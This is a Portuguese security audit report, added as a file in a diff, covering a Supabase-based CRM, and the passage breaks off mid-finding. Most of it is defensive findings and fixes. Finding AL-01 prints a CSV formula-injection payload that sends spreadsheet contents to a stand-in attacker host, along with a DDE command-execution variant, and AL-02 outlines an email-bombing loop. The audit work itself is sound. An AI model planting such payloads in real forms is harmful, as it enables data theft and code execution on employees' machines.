@@ -1,0 +1,1189 @@
+================================================================================
+AUDITORIA DE SEGURANÇA CIBERNÉTICA — PLATAFORMA SANWEY GESTÃO
+================================================================================
+Data................: 19/08/2026
+Escopo..............: repositório danieliudi/sanwey-crm (branch main, v4.58.1)
+                      + projeto Supabase de PRODUÇÃO "Sanwey_crm"
+                        (ref adizvduyfzfftyswkijj, us-east-1, Postgres 17.6)
+                      + 26 Edge Functions ativas
+                      + hospedagem Netlify (netlify.toml)
+Metodologia.........: revisão de código (377 arquivos em src/, 24 edge functions
+                      no repo, 257 migrations), inspeção AO VIVO do banco de
+                      produção (pg_policy, pg_proc, pg_trigger, storage.buckets),
+                      Supabase Security Advisors, npm audit, e verificação de
+                      deriva repo-vs-produção.
+Natureza............: auditoria SOMENTE-LEITURA na sessão original. Nenhuma
+                      migration foi aplicada, nenhuma policy alterada, nenhum
+                      dado modificado NA SESSÃO EM QUE ESTE RELATÓRIO FOI
+                      ESCRITO — ver nota de atualização abaixo.
+
+================================================================================
+ATUALIZAÇÃO — 19/08/2026, sessão seguinte: correções aplicadas
+================================================================================
+Numa segunda sessão no mesmo dia, com aprovação explícita do Daniel, os
+seguintes achados foram CORRIGIDOS e já não refletem o estado atual de
+produção — o resto deste documento permanece como registro histórico do que
+foi encontrado, não como status atual:
+
+  [AL-01] Corrigido — csvCell (export-csv.js) neutraliza injeção de fórmula.
+  [AL-04] Corrigido e deployado — delete-user valida cargo/empresa do alvo.
+  [AC-02] Corrigido — sanwey-crm-mcp, analyze-lead e check-document-
+          legibility commitadas ao repositório (analyze-lead segue ativa em
+          produção, marcada como órfã — decisão de apagá-la ainda pendente).
+  [AL-06] Corrigido e aplicado em produção — profiles_delete/update checam
+          roles[]. NOTA DE RETIFICAÇÃO: a versão original deste achado
+          generalizava a correção às policies de `invitations` também —
+          errado. `invitations.role` não tem `roles[]` irmã (um convite
+          propõe um único cargo), então `role <> 'admin'` já estava correto
+          ali e não foi alterado.
+  [BX-02] Corrigido e aplicado — chat_profile_matches_filter ganhou
+          search_path explícito. Confirmado via get_advisors: 152 → 151.
+  [MD-08] Corrigido — netlify.toml ganhou HSTS, Permissions-Policy,
+          Cross-Origin-Opener-Policy e CSP em Report-Only.
+  [IN-02] Corrigido — react-router-dom atualizado para 7.18.2.
+
+Achados novos, encontrados na auditoria FUNCIONAL da sessão seguinte (ver
+docs/auditoria-funcional-ux-2026-08-19.txt §9) e também já corrigidos:
+  [F-13] CRÍTICO — prospect_seeds sem escopo nenhum (USING enabled=true),
+         legível por qualquer conta autenticada, inclusive agência externa.
+  [F-14] ALTO — agencia_sees_supplier() fail-open fazia a agência externa
+         ver mais entregas que a própria gerente de Marketing.
+  [F-02] ALTO — trigger sync_profile_to_colaborador sem guarda de cargo.
+  [F-15] ALTO — vendedor sem roster de colegas (roster de 1 pessoa).
+
+NÃO corrigidos nesta passada — seguem como estavam:
+  [AL-05] xlsx sem correção — cdn.sheetjs.com fora da política de rede do
+          ambiente de execução; upgrade de vite (5→8) testado e revertido
+          por ser salto de 3 majors com avisos de depreciação na config
+          atual.
+  [AC-01] "Acesso por módulo" continua sem contraparte no banco — decisão de
+          produto pendente (virar controle real vs. renomear a UI).
+  [MD-09] Leaked password protection segue desligado — é config do painel
+          Auth, fora do alcance de uma migration.
+  [BX-01] REVOKE em massa do EXECUTE de anon sobre funções não-públicas —
+          não aplicado, lista de 52 funções precisa de mapeamento cuidadoso.
+  Todo o resto do plano de ação (§7) segue pendente como estava.
+
+--------------------------------------------------------------------------------
+SUMÁRIO EXECUTIVO
+--------------------------------------------------------------------------------
+A plataforma está, em fundamentos, ACIMA da média do mercado para um produto
+deste porte. As três coisas que mais derrubam sistemas Supabase — tabela sem RLS,
+segredo no bundle e XSS — não existem aqui:
+
+  • 120 de 120 tabelas do schema public com RLS habilitada. ZERO exceções.
+  • ZERO segredos hardcoded no repositório ou no bundle do frontend.
+  • ZERO ocorrências de dangerouslySetInnerHTML, innerHTML, eval ou new Function.
+  • Auto-escalação de cargo bloqueada por trigger no banco (não só por policy).
+  • Formulários públicos com WITH CHECK restritivo e rate-limit próprio.
+  • Chaves de API de terceiros (Google, Resend, D4Sign) nunca chegam ao navegador.
+
+As auditorias anteriores (23/07, 2ª auditoria, 08/08, 15/08, 18/08) fecharam
+buracos reais e as correções estão VERIFICADAS em produção. Isto aqui não é uma
+repetição delas — são achados novos.
+
+O que esta auditoria encontrou de novo se concentra em três eixos:
+
+  1. CONTROLE DE ACESSO QUE SÓ EXISTE NO NAVEGADOR. O recurso "Acesso por
+     módulo" (Configurações → Usuários) não tem NENHUMA contraparte no banco.
+     Zero policies RLS chamam current_user_has_module(). Um admin que revoga um
+     módulo acredita ter revogado o dado — não revogou nada.
+
+  2. SUPERFÍCIE FORA DO GIT. Três Edge Functions rodam em produção e NUNCA
+     foram commitadas. Uma delas (sanwey-crm-mcp) roda com service_role,
+     verify_jwt=false, e lê o banco inteiro. Outra (analyze-lead) é órfã, sem
+     checagem de cargo, e continua ATIVA queimando a chave Anthropic da empresa.
+
+  3. O ANÔNIMO DA INTERNET ALCANÇA O DESKTOP DO FUNCIONÁRIO. Os formulários
+     públicos gravam texto livre que 16 telas exportam para CSV sem neutralizar
+     fórmula. Um atacante sem login escreve =HYPERLINK(...) no nome do cliente e
+     isso executa quando alguém do time abre o CSV no Excel.
+
+CONTAGEM: 2 ALTO-CRÍTICO, 6 ALTO, 12 MÉDIO, 10 BAIXO, 6 INFORMATIVO.
+Nenhum achado permite, sozinho, leitura completa do banco por um anônimo.
+
+================================================================================
+PARTE 1 — ACHADOS ALTO-CRÍTICO
+================================================================================
+
+--------------------------------------------------------------------------------
+[AC-01] "Acesso por módulo" e o interruptor global de módulo NÃO existem no
+        banco — o controle é 100% cosmético (Broken Access Control, OWASP A01)
+--------------------------------------------------------------------------------
+Severidade.: ALTO-CRÍTICO
+Local......: src/App.jsx:1702  (único ponto de bloqueio)
+             src/utils/module-access.js:7  (comentário promete espelho em SQL)
+             supabase/migrations/20260924_module_states_espelha_modulos_novos.sql:6
+Confirmado : em produção, via consulta a pg_policy.
+
+EVIDÊNCIA (consulta ao banco de produção):
+  SELECT ... FROM pg_policy WHERE qual ILIKE '%current_user_has_module%'
+     → 0 linhas.
+
+A própria migration 20260924 já registra isso por escrito:
+  "Nenhuma policy RLS chama current_user_has_module() hoje (conferido: 0 ...)"
+— mas o achado foi tratado como nota de rodapé, não como falha de segurança.
+
+O ÚNICO bloqueio hoje é este, no navegador:
+  App.jsx:1702
+  if (!isAgencia && !isPortalOnly && ALL_MODULE_IDS.includes(section)
+      && !allowedModules.has(section)) { ... redireciona ... }
+
+IMPACTO:
+A tela Configurações → Usuários apresenta "Acesso por módulo" como um controle
+de permissão real. Um admin usa isso para, por exemplo, tirar de um vendedor o
+acesso a "RH → Funcionários" (salários, CPF, contratos) ou a "Clientes". O
+usuário continua com a sessão válida e o cargo intacto — e a RLS decide pelo
+CARGO, não pelo módulo. Logo:
+
+  - O redirecionamento do App.jsx é um `if` em JavaScript. Some com ele nas
+    DevTools, ou simplesmente ignore a UI.
+  - Não é preciso nem isso: com o token da própria sessão, um GET direto no
+    PostgREST devolve o dado, porque nenhuma policy conhece o conceito de módulo:
+      curl "$SUPABASE_URL/rest/v1/rh_colaboradores?select=*" \
+           -H "apikey: <anon>" -H "Authorization: Bearer <JWT do próprio usuário>"
+  - O mesmo vale para o interruptor GLOBAL de módulo (module_states,
+    migration 20260923): desligar um módulo "para todo mundo" não fecha a porta
+    de dados, só some o item do menu.
+
+Isto é mais grave que uma permissão faltando, porque cria uma FALSA GARANTIA:
+o admin acredita que revogou acesso e para de monitorar aquele usuário.
+
+CORREÇÃO RECOMENDADA:
+  a) Escolher UMA das duas posturas e ser explícito na UI:
+     (i) Transformar em controle real: adicionar
+         `AND current_user_has_module('<modulo>')` ao predicado de SELECT das
+         tabelas de cada módulo. A função já existe e já lê os overrides —
+         falta só ser chamada. Comece pelos módulos que carregam dado sensível:
+         rh_colaboradores, rh_avaliacoes, rh_movimentacoes, clients, leads,
+         marketing_expenses, crm_viagem_prestacoes.
+     (ii) Se a decisão for manter só como navegação (é uma decisão legítima —
+         menos policies, menos risco de quebrar), então RENOMEAR o rótulo na UI
+         de "Acesso por módulo" para "Itens de menu visíveis" e escrever ali,
+         no próprio card, que isso não restringe dados.
+  b) Registrar a decisão no CLAUDE.md — hoje o comentário em module-access.js:7
+     diz "O espelho em SQL fica em current_user_has_module()", o que induz quem
+     lê a acreditar que a proteção existe.
+  c) Isto é mudança de schema/RLS → exige confirmação explícita do Daniel
+     (regra 5) e passagem pelo security-agent (regra 3.1).
+
+--------------------------------------------------------------------------------
+[AC-02] Três Edge Functions rodam em PRODUÇÃO e nunca foram commitadas no Git —
+        uma delas com service_role + verify_jwt=false
+--------------------------------------------------------------------------------
+Severidade.: ALTO-CRÍTICO (governança / cadeia de suprimentos)
+Local......: produção Supabase vs. supabase/functions/ do repositório
+Confirmado : `git log --all -- supabase/functions/<slug>` → vazio para as três.
+
+DERIVA REPO ↔ PRODUÇÃO:
+
+  Em PRODUÇÃO mas NUNCA no Git (3):
+    • sanwey-crm-mcp            verify_jwt=FALSE   service_role   v4
+    • analyze-lead              verify_jwt=true    anon key       v5
+    • check-document-legibility verify_jwt=true                   v4
+
+  No Git mas NÃO deployada (1):
+    • personal-tasks-agent      (existe em supabase/functions/, ausente da
+                                 lista de functions ativas do projeto)
+
+IMPACTO:
+  - Código que atende requisição na internet, com a chave service_role em mãos,
+    não passa por code review, não tem histórico, não tem diff, e não pode ser
+    reconstruído se o projeto Supabase for perdido. Não há como responder
+    "o que essa função fazia em 12/08?" — a resposta não existe em lugar nenhum.
+  - Todo o processo descrito no CLAUDE.md (design → frontend → QA → segurança)
+    é contornado por construção para essas três.
+  - O `sanwey-crm-mcp` em si está BEM ESCRITO — comparação em tempo constante,
+    somente-leitura, log estruturado de cada chamada, validação de UUID, nunca
+    concatena filtro PostgREST. Não é o código que é o problema: é o fato de
+    ele existir fora do controle de versão. Ele é, por decisão consciente do
+    Daniel (14/08/2026), a conexão de maior alcance da plataforma: token único
+    fixo, nível admin, service_role, sem filtro de empresa. Vazou o
+    SANWEY_MCP_TOKEN, vazou a base de clientes/negócios inteira para leitura.
+  - `personal-tasks-agent` documentado em personal-tasks-agent-api.md como se
+    estivesse no ar, mas não está deployado — se a secretária agêntica for
+    ligada hoje, quebra.
+
+CORREÇÃO RECOMENDADA:
+  a) Commitar as três funções (código já obtido e disponível via
+     mcp__Supabase__get_edge_function) em supabase/functions/<slug>/index.ts.
+  b) Apagar `analyze-lead` de produção (ver AL-03) e `check-document-legibility`
+     se também estiver órfã — confirmar antes: hoje só há MENÇÃO em comentário
+     (src/components/shared/DocumentCaptureModal.jsx:11), nenhuma invocação.
+  c) Regra permanente no CLAUDE.md: "nenhuma edge function vai pra produção sem
+     estar no Git primeiro; deploy é a partir do repo, nunca do editor web".
+  d) Rotacionar SANWEY_MCP_TOKEN periodicamente e documentar onde ele está
+     guardado (hoje só no claude.ai como Custom Connector).
+  e) Decidir sobre personal-tasks-agent: deployar ou remover a documentação.
+
+================================================================================
+PARTE 2 — ACHADOS ALTO
+================================================================================
+
+--------------------------------------------------------------------------------
+[AL-01] Injeção de fórmula em CSV a partir de formulário público —
+        anônimo da internet executa comando no Excel do funcionário
+--------------------------------------------------------------------------------
+Severidade.: ALTO
+Local......: src/utils/export-csv.js:22-29  (csvCell — não neutraliza fórmula)
+             src/utils/export-csv.js:91     (l.company entra cru no CSV)
+             16 telas com "Exportar CSV" (regra 1 do CLAUDE.md)
+Entrada....: rota pública /captura/:slug → RPC submit_lead_capture
+             (também /solicitar-marketing, /vagas/:slug, /trabalhe-conosco,
+              /pesquisa/:id — todas sem login)
+
+CÓDIGO ATUAL (export-csv.js:22):
+  export function csvCell(v) {
+    if (v === null || v === undefined) return "";
+    const s = String(v);
+    if (s.includes(";") || s.includes("\"") || s.includes("\n") || s.includes("\r")) {
+      return `"${s.replace(/"/g, "\"\"")}"`;
+    }
+    return s;
+  }
+
+O tratamento cobre delimitador, aspas e quebra de linha — está correto para
+PARSING. Não cobre nada para EXECUÇÃO: `=`, `+`, `-`, `@`, TAB e CR no início da
+célula continuam intactos, e é exatamente isso que o Excel/LibreOffice/Google
+Sheets interpretam como fórmula ao abrir o arquivo.
+
+CADEIA DE ATAQUE COMPLETA (sem nenhuma credencial):
+  1. Atacante abre https://<app>/captura/<slug> — página pública, sem login.
+  2. Preenche "Nome do cliente" com:
+       =HYPERLINK("https://evil.tld/?x="&A1&B1,"Clique para ver a proposta")
+     ou, em ambiente Windows com DDE habilitado, a variante clássica
+       =cmd|'/c powershell -w hidden ...'!A1
+  3. submit_lead_capture grava isso em `leads.company`
+     (verificado: `company` recebe `btrim(p_customer_name)` sem sanitização —
+      e não deveria mesmo sanitizar ali, o problema é na saída).
+  4. Um vendedor/gerente clica "Exportar CSV" no Funil de Vendas.
+  5. export-csv.js:91 escreve `l.company` cru na coluna.
+  6. O funcionário abre o arquivo. O Excel avalia a fórmula.
+
+O impacto vai de exfiltração silenciosa do conteúdo da planilha inteira
+(a base de leads exportada, com CNPJ, valores e tomador de decisão) até
+execução de comando, dependendo da configuração do Office da máquina.
+
+O ponto que torna isso ALTO e não MÉDIO: a origem é ANÔNIMA e REMOTA (formulário
+público na internet), o alvo é o desktop corporativo, e as 16 telas de export
+compartilham a MESMA função — então uma correção de 4 linhas fecha todas.
+
+CORREÇÃO RECOMENDADA (uma função, cobre os 16 boards):
+  export function csvCell(v) {
+    if (v === null || v === undefined) return "";
+    let s = String(v);
+    // Neutraliza injeção de fórmula: prefixo de apóstrofo faz o Excel tratar
+    // como texto. Cobre =, +, -, @, TAB e CR no início da célula (OWASP CSV
+    // Injection). Não altera o valor exibido na planilha.
+    if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+    if (s.includes(";") || s.includes('"') || s.includes("\n") || s.includes("\r")) {
+      return `"${s.replace(/"/g, '""')}"`;
+    }
+    return s;
+  }
+  Observação: aplicar DEPOIS do prefixo e ANTES do encapsulamento, como acima.
+  Isto NÃO é mudança visual/estrutural (regra 3) — é correção de bug de
+  segurança na serialização, não precisa de mockup.
+
+--------------------------------------------------------------------------------
+[AL-02] Bombardeio de e-mail de terceiro, sem autenticação, a partir do
+        domínio @sanwey.com.br
+--------------------------------------------------------------------------------
+Severidade.: ALTO
+Local......: supabase/functions/rh-send-email/index.ts:769-771
+             (rota pública "candidatura_recebida", sem gate de JWT)
+             + RPC pública submit_job_application
+
+CADEIA DE ATAQUE (sem nenhuma credencial):
+  1. Atacante escolhe uma vaga publicada — o slug é público por definição
+     (/vagas/:slug).
+  2. Chama submit_job_application com o E-MAIL DA VÍTIMA (nome/telefone podem
+     ser inventados; a função só valida formato). A função devolve o
+     `candidate_id` (UUID real da vítima no banco).
+  3. Chama repetidamente, em laço:
+       POST /functions/v1/rh-send-email
+       { "type": "candidatura_recebida",
+         "vagaSlug": "<slug público>",
+         "candidateId": "<uuid devolvido no passo 2>" }
+  4. Cada chamada dispara um e-mail real, via Resend, de noreply@sanwey.com.br
+     para a vítima. Não há dedupe, não há limite de taxa, não há JWT.
+
+O handler em si está BEM FEITO — resolve o destinatário a partir do registro
+(handlePublicCandidaturaRecebida:766, `to: candidato.email`), nunca do body, o
+que impede relay aberto para endereço arbitrário. O furo não é o destinatário:
+é a ausência de qualquer limite na REPETIÇÃO, somada ao fato de que o atacante
+consegue plantar o e-mail da vítima no banco no passo 2.
+
+IMPACTO:
+  - Assédio/bombardeio de uma pessoa específica, com o domínio da Sanwey como
+    remetente. Reputação de domínio (SPF/DKIM já corretos não protegem contra
+    volume) — bounce rate e denúncias de spam derrubam a entregabilidade de
+    TODOS os e-mails transacionais da plataforma, inclusive convites e
+    recuperação de senha.
+  - Queima da cota da conta Resend.
+  - O mesmo padrão vale, em menor grau, para "bemestar_confirmado"
+    (rh-send-email:772) — ali o agendamentoId é um UUID não devolvido ao
+    atacante, então só permite auto-spam.
+
+CORREÇÃO RECOMENDADA:
+  a) Rate-limit no próprio registro, no mesmo espírito dos contadores já usados
+     nas RPCs públicas: antes de enviar, contar quantos e-mails
+     `candidatura_recebida` já saíram para aquele candidate_id (ou para aquele
+     par candidato+vaga) nas últimas 24h; acima de 1-2, devolver o `noop()` que
+     a função já tem. Isso exige uma coluna/tabela de registro de envio →
+     mudança de schema, confirmação do Daniel (regra 5).
+  b) Alternativa sem schema novo: usar `rh_aplicacoes.updated_at` como âncora —
+     só enviar se a aplicação foi criada/atualizada nos últimos N minutos e
+     ainda não tiver marca de envio.
+  c) Independente disso: limite de taxa por IP na borda. A Supabase não oferece
+     isso nativamente por function — considerar colocar as rotas públicas atrás
+     do Netlify (proxy /api/*) onde há rate limiting.
+
+--------------------------------------------------------------------------------
+[AL-03] Edge function órfã `analyze-lead` continua ATIVA em produção, sem
+        checagem de cargo, consumindo a chave Anthropic da empresa
+--------------------------------------------------------------------------------
+Severidade.: ALTO
+Local......: produção, slug `analyze-lead` v5 (fonte NÃO está no Git — ver AC-02)
+             Nenhuma referência em src/ — função morta do ponto de vista do app.
+
+O código só verifica a PRESENÇA do header, nunca a validade nem o cargo:
+    const authHeader = req.headers.get("Authorization");
+    if (!authHeader) return json({ error: "Missing Authorization header" }, 401);
+
+Depois disso monta um client com a ANON key repassando o header, o que faz a
+RLS de `leads` decidir o acesso ao lead — essa parte está correta e é o que
+impede um anônimo puro de extrair dados. O problema é o resto:
+
+  - Nenhum `getUser()`, nenhum `roles[]`, nenhum limite de taxa.
+  - QUALQUER usuário autenticado, de QUALQUER cargo, que enxergue UM lead pela
+    RLS, dispara chamadas ilimitadas à API da Anthropic com a
+    ANTHROPIC_API_KEY da empresa (secret do projeto, não do usuário). Custo
+    direto e sem teto, sem rastro por usuário.
+  - Vaza o corpo de erro do upstream para o cliente:
+      `Claude API ${resp.status}: ${text.slice(0, 400)}`
+  - É superfície ativa mantida sem dono: substituída na prática pela
+    `ai-assistant` (que JÁ foi corrigida com getUser() numa auditoria anterior),
+    mas a versão antiga nunca foi desligada. É o padrão clássico de "corrigimos
+    o endpoint novo e esquecemos o velho no ar".
+
+CORREÇÃO RECOMENDADA:
+  a) APAGAR a function `analyze-lead` do projeto. Nada em src/ a chama.
+     (Confirmar antes com o Daniel: se alguma automação n8n externa a usa, ela
+     precisa migrar para `ai-assistant`.)
+  b) Se, por algum motivo, precisar continuar: commitar no Git, adicionar
+     `getUser()` + checagem de `roles[]` + limite de taxa, e parar de repassar
+     o texto de erro do provider.
+  c) Rodar o mesmo exercício de inventário para `check-document-legibility`.
+
+--------------------------------------------------------------------------------
+[AL-04] `delete-user`: gerente de Marketing/RH pode apagar QUALQUER conta,
+        inclusive a do admin, e de qualquer empresa
+--------------------------------------------------------------------------------
+Severidade.: ALTO
+Local......: supabase/functions/delete-user/index.ts:53-57
+
+CÓDIGO ATUAL:
+  if (!profile || !profileRoles.some((r) =>
+      ["admin", "gerente", "gerente_marketing", "gerente_rh"].includes(r))) {
+    return ... 403 ...
+  }
+  ...
+  if (user_id === userData.user.id) { ... 400 "não pode remover a própria" ... }
+
+A ÚNICA proteção após o 403 é impedir a auto-exclusão. Falta tudo o mais:
+
+  - NÃO verifica o cargo do ALVO. Um `gerente_marketing` apaga a conta do
+    `admin` — profile + linha em auth.users, irreversível pela UI.
+  - NÃO verifica a empresa do alvo. Um gerente da Resibag apaga usuários da
+    Sanwey Indústria e da Monte Mor.
+  - É mais permissivo que a própria RLS da tabela: a policy `profiles_delete`
+    em produção exige
+      `current_user_is_admin() OR (current_user_is_manager()
+       AND role <> 'admin' AND companies && current_user_companies())`
+    — ou seja, o banco protege, mas a edge function roda com service_role e
+    BYPASSA essa policy inteira. A função é literalmente uma porta lateral que
+    contorna a proteção que já existe no banco.
+
+IMPACTO: escalonamento lateral com destruição. Um gerente de Marketing
+descontente (ou uma conta de gerente comprometida por phishing) apaga a
+diretoria e trava a administração da plataforma.
+
+CORREÇÃO RECOMENDADA (delete-user/index.ts, após o 403 atual):
+  1. Buscar o perfil do ALVO: `.select("role, roles, companies").eq("id", user_id)`.
+  2. Se `alvo.roles` contém 'admin' e o chamador NÃO é admin → 403.
+  3. Se o chamador não é admin, exigir interseção de empresas:
+     `alvo.companies && chamador.companies` → senão 403.
+  4. Restringir o conjunto de cargos que podem excluir: hoje
+     `gerente_marketing`/`gerente_rh` excluem contas de qualquer área. Avaliar
+     com o Daniel se isso deve virar só `admin` + `gerente`.
+  5. Espelhar exatamente o predicado de `profiles_delete` (regra 3.1: "policy
+     nova compara com o predicado já em produção") — aqui é o inverso: a
+     function é que precisa se alinhar à policy.
+
+--------------------------------------------------------------------------------
+[AL-05] `xlsx` (SheetJS) com vulnerabilidades ALTAS e SEM correção no npm,
+        usado para ler arquivo enviado pelo usuário em 4 telas
+--------------------------------------------------------------------------------
+Severidade.: ALTO
+Local......: package.json  → "xlsx": "^0.18.5"
+             src/components/lead/ImportModal.jsx:244        XLSX.read(buffer,...)
+             src/components/client/ClientImportModal.jsx:147 XLSX.read(buffer,...)
+             src/components/views/FairImportView.jsx:119     XLSX.read(buffer,...)
+             src/components/views/CRMViagensRelatoriosView.jsx:330 XLSX.read(...)
+
+`npm audit` reporta, para `xlsx *` (todas as versões publicadas no npm):
+    HIGH  Prototype Pollution in sheetJS        (CVE-2023-30533)
+    HIGH  SheetJS Regular Expression DoS        (CVE-2024-22363)
+    "No fix available"
+
+Não existe versão corrigida NO REGISTRY do npm — a SheetJS parou de publicar
+lá na 0.18.5 e passou a distribuir só pelo CDN próprio. Ou seja: `npm update`
+nunca vai resolver isso, e o alerta vai continuar aparecendo para sempre até
+alguém tomar uma decisão explícita.
+
+O que torna isto explorável e não teórico: as 4 chamadas de `XLSX.read()` são
+sobre arquivo ESCOLHIDO PELO USUÁRIO (`accept=".csv,.xlsx,.xls"`). Um .xlsx
+manipulado polui `Object.prototype` na aba do navegador de quem importa,
+o que em SPA React pode virar manipulação de estado, contorno de checagens
+client-side (inclusive as de módulo do AC-01) e, no pior caso, XSS derivado.
+
+CORREÇÃO RECOMENDADA (em ordem de preferência):
+  a) Migrar para a distribuição oficial corrigida:
+       npm remove xlsx
+       npm i https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz
+     (0.20.2+ corrige as duas CVEs. É uma URL de tarball, funciona em
+      package-lock e no build do Netlify.)
+  b) Ou trocar por biblioteca mantida no npm (ex.: `exceljs`) — custo maior,
+     as 4 telas usam `sheet_to_json` com `header: 1`, o mapeamento é direto.
+  c) Em qualquer cenário: limitar tamanho do arquivo antes do parse e fazer o
+     parse dentro de um Web Worker, para que uma poluição de protótipo não
+     alcance o contexto principal da aplicação.
+
+--------------------------------------------------------------------------------
+[AL-06] Checagem de "não é admin" usa a coluna escalar `role` e ignora
+        `roles[]` — gerente consegue rebaixar e apagar um admin
+--------------------------------------------------------------------------------
+Severidade.: ALTO
+Local......: policies em produção — `profiles_delete`, `profiles_update`,
+             `invitations_admin_update`, `invitations_admin_delete`
+
+PREDICADOS EM PRODUÇÃO (verificados via pg_policy):
+  profiles_delete  USING:
+    current_user_is_admin()
+    OR (current_user_is_manager() AND role <> 'admin'
+        AND companies && current_user_companies())
+
+  profiles_update  USING:  ... AND role <> 'admin' ...
+                   WITH CHECK: ... AND role <> 'admin'
+                               AND NOT ('admin' = ANY(COALESCE(roles,'{}'))) ...
+
+O WITH CHECK do UPDATE já foi corrigido para olhar `roles[]`. O USING, não.
+E o `profiles_delete` também não.
+
+A plataforma inteira migrou de cargo escalar para multi-cargo (`roles[]`) — o
+CLAUDE.md documenta isso, e o trigger `profiles_sync_roles` garante
+`role ∈ roles`. Mas a recíproca é FALSA: um usuário pode ter
+`role = 'gerente'` e `roles = ['gerente','admin']`. Para esse usuário,
+`role <> 'admin'` é VERDADEIRO.
+
+CONSEQUÊNCIA:
+  - Um `gerente` da mesma empresa passa no USING de `profiles_delete` e
+    APAGA um administrador cujo admin é cargo adicional.
+  - No `profiles_update`, o USING deixa entrar; o WITH CHECK impede que a linha
+    CONTINUE com admin — o que na prática significa que o gerente pode
+    REMOVER o cargo de admin da pessoa (rebaixamento forçado), e não que está
+    protegido.
+  - Mesmo padrão em `invitations_admin_update` / `invitations_admin_delete`:
+    um gerente mexe num convite de admin desde que o campo escalar `role` do
+    convite não seja literalmente 'admin'.
+
+IMPACTO: perda de controle administrativo da plataforma por um cargo que não
+deveria ter esse poder. É o inverso do self-escalation (que ESTÁ bloqueado, ver
+seção de pontos fortes): aqui é rebaixamento/eliminação lateral do superior.
+
+CORREÇÃO RECOMENDADA:
+  Trocar toda ocorrência de `role <> 'admin'` por
+    `NOT ('admin' = ANY(COALESCE(roles, '{}'::text[])))`
+  nas 4 policies acima. É a mesma expressão que o WITH CHECK de
+  `profiles_update` já usa — basta propagar. Migration nova → confirmação
+  explícita do Daniel (regra 5) + security-agent (regra 3.1) + `get_advisors`
+  depois de aplicar.
+
+================================================================================
+PARTE 3 — ACHADOS MÉDIO
+================================================================================
+
+--------------------------------------------------------------------------------
+[MD-01] Rate-limit dos formulários públicos é GLOBAL, não por IP —
+        vira alavanca de negação de serviço contra o próprio negócio
+--------------------------------------------------------------------------------
+Severidade.: MÉDIO
+Local......: RPC submit_job_application       — `>= 40` em 10 min, GLOBAL
+             RPC submit_talent_pool_application — `>= 40` em 10 min, GLOBAL
+             RPC submit_lead_capture          — `>= 30` em 10 min, por empresa
+             RPC submit_pesquisa_resposta     — por pesquisa, 10 min
+
+Os contadores existem e foram bem pensados contra flood de escrita. Mas contam
+o TOTAL da tabela na janela, sem nenhuma dimensão de origem:
+
+  SELECT count(*) INTO v_recent_count FROM public.rh_aplicacoes
+   WHERE created_at > now() - interval '10 minutes';
+  IF v_recent_count >= 40 THEN RAISE EXCEPTION 'Muitas candidaturas...'
+
+Um atacante dispara 40 candidaturas em segundos e, a partir daí, TODO CANDIDATO
+LEGÍTIMO recebe "Muitas candidaturas no momento. Tente novamente em alguns
+minutos." — indefinidamente, com um laço que custa centavos de banda. O mesmo
+para captura de leads (o funil comercial para de receber) e banco de talentos.
+
+O rate-limit protege o banco e fecha a porta do negócio junto.
+
+CORREÇÃO RECOMENDADA:
+  a) Curto prazo, sem schema novo: manter o teto global como circuit-breaker de
+     último recurso (é útil), mas subir bastante o número e adicionar um teto
+     ESTREITO por identidade já disponível — e-mail e telefone normalizados
+     (`submit_lead_capture` já faz isso certo: 3 por telefone / 24h). Replicar
+     esse padrão de "por contato" em submit_job_application e
+     submit_talent_pool_application.
+  b) Médio prazo: limite por IP na borda (Netlify/Cloudflare na frente das
+     rotas públicas) — a Supabase não expõe IP para RPC via PostgREST.
+  c) Nunca deixar o teto global ser o único mecanismo.
+
+--------------------------------------------------------------------------------
+[MD-02] Formulário público de Marketing grava direto na tabela, SEM rate-limit
+--------------------------------------------------------------------------------
+Severidade.: MÉDIO
+Local......: src/components/public/MarketingRequestForm.jsx:191
+             policy `marketing_requests_public_insert` (role PUBLIC, em produção)
+
+Diferente dos outros formulários públicos (que passam por RPC SECURITY DEFINER
+com contador), este faz INSERT direto com a chave anon:
+  await supabase.from("marketing_requests").insert({ ... })
+
+A policy está BEM CONSTRUÍDA quanto a conteúdo — trava exatamente as colunas que
+importam:
+  WITH CHECK (status='pendente' AND is_demo=false AND approved_by IS NULL
+              AND approved_at IS NULL AND deliverable_id IS NULL
+              AND task_id IS NULL AND purchase_request_id IS NULL
+              AND rejection_reason IS NULL
+              AND company_ids <@ ARRAY['industria','resibag','montemor'])
+Não dá para se auto-aprovar nem para vincular a registros existentes. Bom.
+
+O que falta é volume: qualquer pessoa na internet insere linhas ilimitadas em
+`marketing_requests`. Isso enche o board de Solicitações de lixo, consome
+protocolo (`get_marketing_request_number`), e degrada a tela até o time perder
+a capacidade de achar solicitação real. É o descumprimento direto do item do
+próprio checklist do CLAUDE.md 3.1: "Rota pública não grava coluna arbitrária
+NEM PERMITE ABUSO SEM LIMITE DE TAXA" — a primeira metade foi feita, a segunda
+não.
+
+CORREÇÃO RECOMENDADA:
+  Converter para RPC SECURITY DEFINER (`submit_marketing_request`) no mesmo
+  molde de `submit_lead_capture`, com contador por janela + por e-mail do
+  solicitante, e revogar o INSERT público direto na tabela. Migration nova →
+  confirmação do Daniel.
+
+--------------------------------------------------------------------------------
+[MD-03] Bucket `rh-curriculos`: anônimo grava arquivos ilimitados, e o UUID de
+        um candidato existente pode ser obtido só com o e-mail dele
+--------------------------------------------------------------------------------
+Severidade.: MÉDIO
+Local......: policy `rh_curriculos_public_insert` (produção)
+             supabase/migrations/20260713_fix_rh_curriculos_public_insert.sql
+             RPC submit_talent_pool_application (ON CONFLICT (email) ... RETURNING id)
+
+A correção de 13/07 fechou o furo original (path 100% livre) exigindo que a
+primeira pasta seja um candidato existente:
+  WITH CHECK (bucket_id='rh-curriculos'
+              AND rh_candidato_exists((storage.foldername(name))[1]::uuid))
+
+Restam duas brechas:
+
+  (a) FLOOD DE STORAGE. Nada limita a QUANTIDADE de objetos sob um UUID válido.
+      O atacante cria o próprio candidato (1 chamada), recebe o UUID, e a partir
+      daí grava quantos PDFs de 10 MB quiser em `<uuid>/qualquer-nome-N.pdf`.
+      Custo de armazenamento sem teto, sem dono e sem alerta.
+
+  (b) DIVULGAÇÃO DE UUID DE CANDIDATO REAL. `submit_talent_pool_application` faz
+      `ON CONFLICT (email) DO UPDATE ... RETURNING id` — ou seja, submeter com o
+      e-mail de um candidato JÁ CADASTRADO devolve o UUID interno dele. Com esse
+      UUID, o atacante passa a poder gravar arquivos na pasta daquela pessoa.
+      Sobrescrever o currículo legítimo não funciona (não há policy de UPDATE
